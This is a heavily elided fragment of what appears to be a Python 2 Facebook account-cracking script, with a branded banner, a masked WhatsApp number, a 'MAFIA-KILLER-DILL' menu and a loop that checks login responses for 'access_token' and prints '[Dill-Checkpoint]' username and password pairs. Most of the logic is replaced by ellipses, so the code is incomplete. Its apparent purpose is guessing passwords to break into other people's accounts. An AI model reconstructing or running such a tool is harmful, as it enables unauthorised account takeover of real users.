...
\x1b[1;92m➣ NAME :           💗 DILL MOHAMMAD 💗

\x1b[1;91m➣ PGE NAME :  💣DILL MOHAMMAD💣

\x1b[1;93m➣ WHATSAPP NO :   👬 +88013******** 👬
...
def menu():
	...
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-DILL)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/channel/UC7ZHiW8KUI5G47gyqUpmu5w')
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					print '\033[1;96m[Dill-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
